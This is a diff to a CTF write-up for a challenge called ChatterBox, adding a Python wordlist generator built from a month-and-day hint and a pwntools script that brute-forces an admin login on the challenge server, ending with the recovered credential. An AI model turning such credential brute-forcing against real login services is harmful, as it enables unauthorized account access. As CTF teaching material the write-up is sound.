@@ -177,7 +177,7 @@ Flag: csean-ctf{welcome_to_the_gamezzzz!}
 #### ChatterBox [First Blood 🩸]
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bb8ee28-f7ad-4803-a864-700b9a1e31a2)
 
-This challenge isn't really pwn in my opinion just more of like scripting
+This challenge isn't really bianry exploitation in my opinion just more of like scripting
 
 Anyways we are given this:
 
@@ -202,7 +202,83 @@ So back to what the description says :
 As a side note, we think you should know we like talking in months and days. Hopefully you understand.
 ```
 
-This is a hint 
+This is a hint that's based on using months and days
+
+I then make a script to create a wordlist and brute force the password
+
+Here's the script used to create the wordlist
+
+```
+#!/usr/bin/python3
+
+# Hint to how the password should be: As a side note, we think you should know we like talking in months and days. 
+
+# Months
+months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
+months_upper = [j.upper() for j in months]
+months2_lower = [i.lower() for i in months]
+
+# Date
+dates = [str(date) for date in range(32)]
+
+# Form the wordlist
+wordlist = []
+
+for month in months:
+    for date in dates:
+        wordlist.append(month + date)
+
+for month in months_upper:
+    for date in dates:
+        wordlist.append(month + date)
+
+for month in months2_lower:
+    for date in dates:
+        wordlist.append(month + date)
+
+
+# Save wordlist
+with open('wordlist.txt', 'w') as fd:
+    for i in wordlist:
+        fd.write(i+'\n')
+```
+
+And I used this to brute force 
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import sys
+from multiprocessing import Pool as pool
+from warnings import filterwarnings
+
+# Set context
+context.log_level = 'info'
+filterwarnings('ignore')
+
+# Define a function for the brute force >3
+def brute_password(password):
+    io = remote('0.cloud.chals.io', 33091)
+    io.recv(1024) 
+    io.sendline(b"admin")
+    io.recv(1024)
+    io.sendline(password)
+    result = io.recv(1024)
+    print(result)
+    if b"Invalid credentials" not in result:
+        print(f'Password: {password}')
+        
+        
+# Read password from the wordlist 
+with open('wordlist.txt', 'r') as fd:
+    wordlist = fd.readlines()
+
+if __name__ == '__main__':
+    start = pool(int('5'))
+    start.map(brute_password, wordlist)
+
+# Credential: admin:july10
+```
 
 
 
